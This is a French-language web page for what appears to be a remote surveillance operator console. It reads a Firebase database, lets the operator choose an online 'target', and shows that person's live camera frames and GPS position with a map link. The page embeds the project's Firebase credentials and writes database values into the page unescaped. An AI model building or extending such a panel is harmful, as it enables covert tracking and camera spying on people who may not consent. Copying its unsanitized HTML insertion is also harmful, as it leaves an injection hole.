<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Console Admin - Surveillance Live</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
        @keyframes pulse-red {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        .live-pulse {
            animation: pulse-red 1s infinite;
        }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-8">

    <div class="max-w-6xl mx-auto space-y-6">
        
        <!-- En-tête -->
        <div class="flex flex-col md:flex-row md:items-center justify-between p-6 bg-slate-900 border border-slate-800 rounded-3xl shadow-xl gap-4">
            <div>
                <h1 class="text-2xl md:text-3xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent flex items-center gap-2">
                    <span>🎥</span> Console de Surveillance Live
                </h1>
                <p class="text-slate-400 text-sm mt-1">Réception directe du flux d'images et données GPS</p>
            </div>
            <div id="connectionStatus" class="px-4 py-2 bg-slate-950 border border-slate-800 rounded-2xl text-xs font-semibold text-slate-400 flex items-center gap-2">
                <span class="w-2.5 h-2.5 rounded-full bg-slate-600" id="statusDot"></span>
                <span id="statusText">Système en attente</span>
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            
            <!-- Panneau de contrôle gauche -->
            <div class="space-y-6 lg:col-span-1">
                <!-- Sélecteur d'utilisateur -->
                <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl">
                    <h2 class="text-sm font-semibold text-slate-400 mb-4 uppercase tracking-wider">👤 Utilisateurs en ligne</h2>
                    <div class="space-y-4">
                        <div>
                            <label class="block text-xs text-slate-500 mb-2">Choisir une cible :</label>
                            <select id="userSelect" class="w-full bg-slate-950 text-slate-300 border border-slate-800 rounded-xl p-3 text-sm focus:outline-none focus:border-indigo-500 transition-all">
                                <option value="">-- Attente d'utilisateurs --</option>
                            </select>
                        </div>
                    </div>
                </div>

                <!-- Position GPS -->
                <div id="userInfo" class="hidden bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl space-y-4">
                    <h3 class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📍 Coordonnées GPS</h3>
                    <div id="gpsData" class="space-y-3 text-sm">
                        <!-- Rempli en JS -->
                    </div>
                </div>

                <!-- Terminal des logs de connexion -->
                <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl flex flex-col h-64">
                    <h3 class="text-sm font-semibold text-slate-400 mb-3 uppercase tracking-wider">💾 Logs système</h3>
                    <div id="connectionLog" class="flex-1 bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] font-mono text-cyan-400 overflow-y-auto space-y-1">
                        <!-- Rempli en JS -->
                    </div>
                </div>
            </div>

            <!-- Retour d'image (Droite) -->
            <div class="lg:col-span-2 space-y-4">
                <div class="bg-slate-900 border border-slate-800 rounded-3xl p-4 shadow-xl flex flex-col">
                    <div class="flex items-center justify-between mb-3 px-2">
                        <span class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📺 Flux d'images</span>
                        <div class="flex items-center gap-3 text-xs text-slate-500">
                            <span id="metaRes">-- px</span>
                            <span class="text-slate-700">|</span>
                            <span id="metaLatency">-- ms (latence)</span>
                        </div>
                    </div>

                    <!-- Cadre d'image -->
                    <div class="relative bg-slate-950 aspect-video rounded-2xl overflow-hidden border border-slate-850 flex items-center justify-center min-h-[350px]">
                        <div id="placeholderText" class="absolute flex flex-col items-center justify-center text-slate-600 p-6 text-center">
                            <span class="text-5xl mb-3">📡</span>
                            <p class="text-sm font-medium">Sélectionnez un utilisateur actif à gauche puis cliquez sur "Se connecter"</p>
                        </div>
                        <img id="remoteImage" alt="Flux Live" class="hidden w-full h-full object-contain">
                    </div>

                    <!-- Boutons d'action -->
                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
                        <button id="connectBtn" class="py-3 px-4 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
                            🔗 Se connecter
                        </button>
                        <button id="disconnectBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-red-900 hover:text-white text-slate-400 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
                            ⏹️ Arrêter
                        </button>
                        <button id="fullscreenBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
                            🖥️ Plein écran
                        </button>
                        <button id="debugBtn" class="py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-all col-span-1">
                            🐛 Infos Flux
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
            authDomain: "universite-taak.firebaseapp.com",
            databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
            projectId: "universite-taak",
            storageBucket: "universite-taak.firebasestorage.app",
            messagingSenderId: "550634728649",
            appId: "1:550634728649:web:12147e8dec3a04618c3118",
            measurementId: "G-RD7KY6BFP4"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        let currentUserId = null;
        let frameListenerRef = null;
        let locationListenerRef = null;
        let frameCount = 0;

        const remoteImage = document.getElementById('remoteImage');
        const placeholderText = document.getElementById('placeholderText');
        const connectBtn = document.getElementById('connectBtn');
        const disconnectBtn = document.getElementById('disconnectBtn');
        const fullscreenBtn = document.getElementById('fullscreenBtn');
        const debugBtn = document.getElementById('debugBtn');
        const userSelect = document.getElementById('userSelect');
        const userInfoDiv = document.getElementById('userInfo');
        const gpsDataDiv = document.getElementById('gpsData');
        const connectionLog = document.getElementById('connectionLog');

        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const metaRes = document.getElementById('metaRes');
        const metaLatency = document.getElementById('metaLatency');

        function addLog(message) {
            const time = new Date().toLocaleTimeString();
            connectionLog.innerHTML = `<p>[${time}] ${message}</p>` + connectionLog.innerHTML;
        }

        function setSystemStatus(message, state = 'idle') {
            statusText.innerText = message;
            statusDot.className = "w-2.5 h-2.5 rounded-full";
            
            if (state === 'live') {
                statusDot.classList.add('bg-red-500', 'live-pulse');
            } else if (state === 'pending') {
                statusDot.classList.add('bg-amber-500');
            } else {
                statusDot.classList.add('bg-slate-600');
            }
        }

        function loadUsers() {
            const usersRef = ref(database, 'users');
            onValue(usersRef, (snapshot) => {
                const users = snapshot.val();
                const previousSelection = userSelect.value;
                
                userSelect.innerHTML = '<option value="">-- Choisir un utilisateur --</option>';
                
                let foundActive = false;
                if (users) {
                    Object.keys(users).forEach(userId => {
                        const userObj = users[userId];
                        // Supporte à la fois un booléen pur ou un objet complexe
                        const isUserActive = userObj === true || userObj.active === true || (userObj.active && userObj.active.active === true);
                        
                        if (isUserActive) {
                            foundActive = true;
                            const isSelected = (userId === previousSelection) ? 'selected' : '';
                            userSelect.innerHTML += `<option value="${userId}" ${isSelected}>👤 Utilisateur #${userId.slice(-6).toUpperCase()} (En ligne)</option>`;
                        }
                    });
                }
                
                if (!foundActive) {
                    userSelect.innerHTML = '<option value="">-- Aucun utilisateur actif --</option>';
                }
            });
        }

        function loadUserInfo(userId) {
            if (locationListenerRef) {
                off(locationListenerRef);
            }
            locationListenerRef = ref(database, `users/${userId}/location`);
            onValue(locationListenerRef, (snapshot) => {
                const location = snapshot.val();
                if (location) {
                    userInfoDiv.style.display = 'block';
                    gpsDataDiv.innerHTML = `
                        <div class="space-y-1">
                            <span class="text-xs text-slate-500 block">Latitude</span>
                            <span class="font-mono text-slate-200 font-bold">${location.lat}</span>
                        </div>
                        <div class="space-y-1">
                            <span class="text-xs text-slate-500 block">Longitude</span>
                            <span class="font-mono text-slate-200 font-bold">${location.lng}</span>
                        </div>
                        <div class="pt-2">
                            <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" 
                               target="_blank" class="w-full inline-block text-center py-2 px-4 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 font-semibold rounded-xl text-xs transition-all">
                                🗺️ Ouvrir dans Google Maps
                            </a>
                        </div>
                        <div class="text-[10px] text-slate-500 text-right pt-1">
                            Mis à jour : ${new Date(location.timestamp).toLocaleTimeString()}
                        </div>
                    `;
                } else {
                    userInfoDiv.style.display = 'none';
                }
            });
        }

        function connectToUser() {
            currentUserId = userSelect.value;
            if (!currentUserId) {
                setSystemStatus("⚠️ Choisissez une cible", "pending");
                addLog("⚠️ Erreur : aucun utilisateur sélectionné.");
                return;
            }

            disconnect();
            currentUserId = userSelect.value;
            
            setSystemStatus("🔄 Connexion...", "pending");
            connectBtn.disabled = true;
            disconnectBtn.disabled = false;
            fullscreenBtn.disabled = false;
            
            addLog(`🔍 Demande du flux pour l'utilisateur #${currentUserId.slice(-6).toUpperCase()}...`);
            
            frameListenerRef = ref(database, `live/${currentUserId}/frame`);
            frameCount = 0;

            onValue(frameListenerRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.image) {
                    placeholderText.style.display = 'none';
                    remoteImage.src = data.image; // Insertion directe du Base64 dans le tag <img>
                    remoteImage.style.display = 'block';
                    frameCount++;

                    const latency = Date.now() - data.timestamp;
                    metaLatency.innerText = `${latency} ms`;
                    metaRes.innerText = `${remoteImage.naturalWidth || '--'} x ${remoteImage.naturalHeight || '--'} px`;

                    if (frameCount === 1) {
                        setSystemStatus("🔴 EN DIRECT", "live");
                        addLog("✅ Flux d'images reçu et stabilisé !");
                    }
                } else {
                    addLog("⚠️ En attente du démarrage de la caméra côté utilisateur...");
                }
            }, (error) => {
                addLog(`❌ Erreur Firebase: ${error.message}`);
            });

            loadUserInfo(currentUserId);
        }

        function disconnect() {
            if (frameListenerRef) {
                off(frameListenerRef);
                frameListenerRef = null;
            }
            if (locationListenerRef) {
                off(locationListenerRef);
                locationListenerRef = null;
            }
            
            remoteImage.src = "";
            remoteImage.style.display = 'none';
            placeholderText.style.display = 'flex';
            userInfoDiv.style.display = 'none';
            
            connectBtn.disabled = false;
            disconnectBtn.disabled = true;
            fullscreenBtn.disabled = true;
            
            metaRes.innerText = "-- px";
            metaLatency.innerText = "-- ms";
            frameCount = 0;
            
            setSystemStatus("🔌 Déconnecté", "idle");
            addLog("🔌 Déconnecté");
        }

        function toggleFullscreen() {
            if (!document.fullscreenElement) {
                remoteImage.requestFullscreen().catch(err => {
                    console.error("Erreur plein écran:", err);
                });
            } else {
                document.exitFullscreen();
            }
        }

        connectBtn.addEventListener('click', connectToUser);
        disconnectBtn.addEventListener('click', disconnect);
        fullscreenBtn.addEventListener('click', toggleFullscreen);
        userSelect.addEventListener('change', disconnect);
        
        debugBtn.addEventListener('click', () => {
            if (remoteImage.src) {
                addLog(`ℹ️ [DEBUG] Image active: ${remoteImage.naturalWidth}x${remoteImage.naturalHeight}px. Nb images reçues: ${frameCount}`);
            } else {
                addLog(`⚠️ [DEBUG] Aucun flux actif.`);
            }
        });

        loadUsers();
    </script>
</body>
</html>
